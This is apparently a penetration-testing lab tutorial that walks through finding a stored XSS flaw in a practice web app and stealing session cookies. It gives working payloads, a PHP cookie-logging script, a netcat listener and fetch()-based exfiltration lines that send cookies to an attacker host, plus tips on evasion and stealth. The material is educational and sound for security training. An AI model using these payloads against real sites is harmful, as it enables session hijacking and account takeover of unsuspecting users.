# Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) vulnerabilities are among the most common web application vulnerabilities. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. In this section, though, we will focus on exploiting Cross-Site Scripting (XSS) vulnerabilities to obtain valid session identifiers (such as session cookies).
For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
Session cookies should be carried in all HTTP requests
Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)
Navigate to http://xss.htb.net and log in to the application using the credentials below:
It looks like we can edit the input fields to update our email, phone number, and country.
In such cases, it is best to use payloads with event handlers like onload or onerror since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like onmouseover.
In one field, let us specify the following payload:
```
"><img src=x onerror=prompt(document.domain)>
```
We are using document.domain to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks
We will need to update the profile by pressing "Save" to submit our payloads.
The profile was updated successfully. We notice no payload being triggered, though! Often, the payload code is not going to be called/executed until another application functionality triggers it. Let us go to "Share," as it is the only other functionality we have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vulnerability in such a functionality would be ideal from an attacker's perspective.
That is indeed the case! The payload specified in the Country field fired!
Let us now check if `HTTPOnly` is "off" using Web Developer Tools.
`HTTPOnly` is off!
In the remaining two fields, let us specify the following two payloads.
```
"><img src=x onerror=confirm(1)>
```
```
"><img src=x onerror=alert(1)>
```
## Obtaining session cookies through XSS
We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.
1. Let us create a cookie-logging script (save it as log.php) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).
```
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.
2. The cookie-logging script can be run as follows. TUN Adapter IP is the tun interface's IP of either Pwnbox or your own VM.
```
php -S <VPN/TUN Adapter IP>:8000
```
3. Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the Country field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.
```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```
Note: If you're doing testing in the real world, try using something like XSSHunter, Burp Collaborator or Project Interactsh. A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
A sample HTTPS>HTTPS payload example can be found below:
```
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
### Simulate the victim
1. Open a New Private Window, navigate to http://xss.htb.net and log in to the application using the credentials below: This account will play the role of the victim!
2. Now, navigate to http://xss.htb.net/profile?email=ela.stienen@example.com. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified). You should now see the below in your attacking machine.
3. Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside cookieLog.txt
4. You can now use this stolen cookie to hijack the victim's session!
## Obtaining session cookies via XSS (Netcat edition)
1. Before we simulate the attack, let us place the below payload in the Country field of Ela Stienen's profile and click "Save." There are no specific requirements for the payload. We just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.
```
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
2. Let us also instruct Netcat to listen on port 8000 as follows.
```
nc -lvnp 8000
```
3. Open a New Private Window and navigate to http://xss.htb.net/profile?email=ela.stienen@example.com, simulating what the victim would do. We remind you that the above is an attacker-controlled public profile hosting a cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified). By the time you hold your mouse over "test," you should now see the below in your attacking machine. Please note that the cookie is a Base64 value because we used the btoa() function, which will base64 encode the cookie's value.
4. You can now use this stolen cookie to hijack the victim's session!
5. We don't necessarily have to use the window.location() object that causes victims to get redirected. We can use fetch(), which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.
```
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```